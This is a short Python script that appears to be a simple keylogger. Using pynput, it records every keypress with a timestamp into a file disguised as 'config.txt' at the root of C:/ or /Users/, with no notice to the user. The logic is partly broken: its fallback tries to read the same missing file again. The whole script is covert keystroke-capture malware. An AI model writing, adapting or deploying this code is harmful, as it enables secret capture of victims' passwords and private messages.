from pynput.keyboard import Key, Listener
import datetime, os
try:
    os.chdir('C:/')
except:
    os.chdir('/Users/')
try:
    file = open('config.txt', 'r')
except:
    file = open('config.txt', 'r')
    lines = file.readlines()
    file = open('config.txt', 'w')
    file.writelines(lines)
    file.close()
def on_press(key):
    file = open('config.txt', 'r')
    lines = file.readlines()
    file = open('config.txt', 'w')
    file.writelines(lines)
    contents = f'{datetime.datetime.today()}: {key}\n'
    file.writelines(contents)
    file.close()
def on_release(key):
    pass
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
